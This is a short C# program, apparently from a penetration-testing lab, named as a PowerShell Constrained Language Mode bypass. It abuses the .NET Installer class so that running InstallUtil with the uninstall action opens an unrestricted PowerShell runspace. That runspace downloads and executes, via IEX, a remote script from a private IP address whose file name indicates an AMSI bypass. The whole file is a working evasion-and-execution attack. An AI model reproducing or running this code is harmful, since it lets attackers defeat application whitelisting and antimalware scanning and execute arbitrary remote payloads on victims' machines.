using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace CLM_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Executing order 66!");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.49.112/amsi-bypass-powershell.txt'))";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
